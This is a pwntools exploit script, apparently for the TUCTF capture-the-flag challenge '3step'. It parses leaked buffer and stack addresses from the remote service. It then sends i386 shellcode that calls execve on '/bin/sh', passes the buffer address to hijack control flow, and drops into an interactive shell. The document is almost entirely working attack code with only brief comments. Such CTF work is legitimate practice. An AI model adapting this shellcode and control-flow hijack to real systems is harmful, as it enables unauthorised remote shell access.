#!/usr/bin/python3
from pwn import *
context.arch = 'i386'

p = remote('chal.tuctf.com', 30504)
# p = process('./3step')

p.recvuntil(b'snacks\x0a')
buf = int(p.recvuntil(b'\x0a', drop=True), 16)
stackEBP = int(p.recvuntil(b'\x0a', drop=True), 16) + 0x1c
log.info('buf: %s' % hex(buf))
log.info('stackEBP: %s' % hex(stackEBP))

# Put shellcode at buf on bss
# Put string "/bin/sh" at stack
# Call shellcode

sc = asm('''
    push 0xb
    pop eax
    mov ebx, ''' + hex(stackEBP - 0x1c) +
    '''
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''')

p.sendlineafter(': ', sc)
p.sendlineafter(': ', b'/bin/sh\x00')
p.sendlineafter(': ', p32(buf))

p.interactive()
